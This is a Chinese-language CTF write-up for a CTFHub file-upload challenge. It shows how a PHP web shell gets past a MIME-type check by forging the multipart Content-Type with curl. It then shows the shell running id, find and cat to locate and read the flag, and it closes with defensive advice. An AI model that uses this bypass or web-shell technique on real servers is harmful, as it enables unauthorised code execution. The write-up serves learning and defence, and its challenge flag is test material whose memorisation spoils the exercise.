---
layout: writeup
tags: [ctfhub]

title: "CTFHub CTF Writeup - MIME绕过"
date: 2026-10-28

skill: "web-upload/MIME绕过"
completed: true
---

# CTFHub Writeup - MIME绕过

## 题目类型

Web

## 题目描述

CTFHub 文件上传 - MIME验证
Filename:选择文件 未选择文件
Submit


## 解题过程

<br>1. 用户记录中先分析了服务端 index.php 的核心逻辑：程序使用 in\_array($\_FILES\['file'\]\['type'\], \["image/jpeg", "image/png", "image/gif", "image/jpg"\]) 判断上传字段的 type，而该值来自 multipart 请求中的 Content-Type，由客户端提供。
<br>2. 用户先用 curl 以 type=application/octet-stream 上传 shell.php，服务端返回 \<script\>alert('文件类型不正确')\</script\>，上传被拦截。
<br>3. 随后用户使用 curl.exe -s -F "file=@shell.php;type=image/png" -F "submit=Submit" 重新上传，服务端返回 \<script\>alert('上传成功')\</script\>，并给出上传文件相对路径 upload/shell.php；记录说明文件字节未改，只修改了请求中的 Content-Type。
<br>4. 用户访问 upload/shell.php?c=id，回显 uid=33(www-data) gid=33(www-data) groups=33(www-data)。
<br>5. 用户继续执行 ?c=find / -maxdepth 5 -iname "flag\*"，结果找到 /var/www/html/flag\_1260921674.php。
<br>6. 用户再执行 ?c=cat /var/www/html/flag\_1260921674.php，得到 \<?php // ctfhub\{04422bf070fade2c3b2472fb\}。

## 疑问与解答

### 1.

<br>问题：为什么只修改 Content-Type 就能绕过文件类型检查？
<br>解答：因为该检查读取的是 multipart 报文里的 Content-Type 字段，这个字段由客户端填写，并不等于文件真实内容或扩展名；服务端若只信任它，就无法区分伪装成图片的 PHP 文件。

### 2.

<br>问题：上传后的 shell.php 为什么可能被执行？
<br>解答：如果上传目录位于 Web 根目录且服务器按扩展名把 .php 文件交给 PHP 解析，攻击者上传的脚本就可能被访问执行；因此服务端应避免使用原始文件名落盘，并禁止上传目录解析脚本。

### 3.

<br>问题：如何正确防御 MIME 验证绕过？
<br>解答：不能只检查 $\_FILES\['type'\]，应结合服务端文件内容检测、扩展名白名单、随机重命名、限制上传目录执行权限，并避免上传文件直接进入可执行路径。


## 本题的核心逻辑：



<br>本题的核心是文件上传功能把客户端提供的 Content-Type 当作可信的文件类型依据。由于 multipart 中的 Content-Type 可被攻击者随意设置，只修改这一请求头即可让 PHP 文件通过图片类型校验，而文件内容并不需要改变。

<br>记录中的实际结果也印证了这一点：同一份 shell.php 从 application/octet-stream 改为 image/png 后上传成功，并以 upload/shell.php 的路径落盘。


## 笔记

这道题主要学习了：

<br>1. MIME 验证绕过说明请求头里的 Content-Type 只能代表客户端声明，不能作为服务端判断文件真实类型的唯一依据。
<br>2. 文件上传安全需要同时校验内容、扩展名和落盘方式，并配合上传目录不可执行、随机文件名等限制，避免脚本被 Web 服务器解析。
